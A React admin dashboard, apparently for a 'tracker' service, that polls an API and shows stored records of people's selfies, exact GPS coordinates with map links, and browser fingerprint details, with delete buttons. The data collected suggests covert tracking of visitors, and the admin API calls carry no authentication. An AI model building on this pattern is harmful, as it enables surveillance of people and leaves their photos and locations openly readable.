import React, { useState, useEffect } from 'react';
import axios from 'axios';

const API_BASE_URL = (import.meta.env.VITE_API_BASE_URL || 'https://tracker-backend-eta.vercel.app').replace(/\/+$/, '');

function AdminDashboard() {
  const [records, setRecords] = useState([]);
  const [deleting, setDeleting] = useState(false);

  useEffect(() => {
    fetchRecords();
    // Poll for new records every 5 seconds instead of Socket.IO
    const interval = setInterval(fetchRecords, 5000);
    return () => clearInterval(interval);
  }, []);

  const fetchRecords = async () => {
    try {
      const response = await axios.get(`${API_BASE_URL}/api/records`);
      setRecords(response.data);
    } catch (error) {
      console.error('Error fetching records:', error);
    }
  };

  const deleteRecord = async (id) => {
    if (!window.confirm('Are you sure you want to delete this record?')) return;
    try {
      await axios.delete(`${API_BASE_URL}/api/records/${id}`);
      fetchRecords();
    } catch (error) {
      console.error('Error deleting record:', error);
    }
  };

  const deleteAllRecords = async () => {
    if (!window.confirm('Are you sure you want to delete ALL records? This cannot be undone!')) return;
    try {
      setDeleting(true);
      await axios.delete(`${API_BASE_URL}/api/records`);
      fetchRecords();
    } catch (error) {
      console.error('Error deleting all records:', error);
    } finally {
      setDeleting(false);
    }
  };

  return (
    <div className="min-h-screen bg-gradient-to-br from-gray-50 to-gray-100 p-4 md:p-8">
      <div className="max-w-7xl mx-auto">
        <div className="flex flex-col md:flex-row md:items-center md:justify-between mb-8 gap-4">
          <h1 className="text-3xl font-bold text-gray-800">Admin Dashboard</h1>
          {records.length > 0 && (
            <button
              onClick={deleteAllRecords}
              disabled={deleting}
              className="bg-red-500 hover:bg-red-600 disabled:bg-red-300 text-white font-semibold px-6 py-3 rounded-lg shadow-md transition-all"
            >
              {deleting ? 'Deleting...' : 'Delete All'}
            </button>
          )}
        </div>
        <div className="grid grid-cols-1 md:grid-cols-2 lg:grid-cols-3 gap-6">
          {records.map(record => (
            <div key={record._id} className="bg-white rounded-xl shadow-lg overflow-hidden">
              <div className="p-4">
                {record.selfie && record.selfie !== 'placeholder.jpg' ? (
                  <img
                    src={record.selfie}
                    alt="Selfie"
                    className="w-full h-48 object-cover rounded-lg mb-4"
                  />
                ) : (
                  <div className="w-full h-48 bg-gradient-to-br from-blue-100 to-purple-100 flex items-center justify-center rounded-lg mb-4">
                    <span className="text-gray-500 text-sm">Selfie Placeholder</span>
                  </div>
                )}
                <div className="space-y-2 text-sm text-gray-600 mb-4">
                  <p><strong>Location:</strong></p>
                  <a
                    href={`https://www.google.com/maps?q=${record.location.latitude},${record.location.longitude}`}
                    target="_blank"
                    rel="noopener noreferrer"
                    className="text-blue-600 hover:underline"
                  >
                    {record.location.latitude.toFixed(4)}, {record.location.longitude.toFixed(4)}
                  </a>
                  <p><strong>Browser:</strong> {record.browserInfo?.browserName}</p>
                  <p><strong>OS:</strong> {record.browserInfo?.os}</p>
                  <p><strong>Resolution:</strong> {record.browserInfo?.screenResolution}</p>
                  <p><strong>Language:</strong> {record.browserInfo?.language}</p>
                  <p><strong>Time Zone:</strong> {record.browserInfo?.timeZone}</p>
                  <p><strong>Timestamp:</strong> {new Date(record.timestamp).toLocaleString()}</p>
                </div>
                <button
                  onClick={() => deleteRecord(record._id)}
                  className="w-full bg-red-500 hover:bg-red-600 text-white font-semibold px-4 py-2 rounded-lg transition-all"
                >
                  Delete
                </button>
              </div>
            </div>
          ))}
        </div>
        {records.length === 0 && (
          <div className="text-center text-gray-500 mt-12">
            <p className="text-xl font-semibold">No records yet!</p>
          </div>
        )}
      </div>
    </div>
  );
}

export default AdminDashboard;
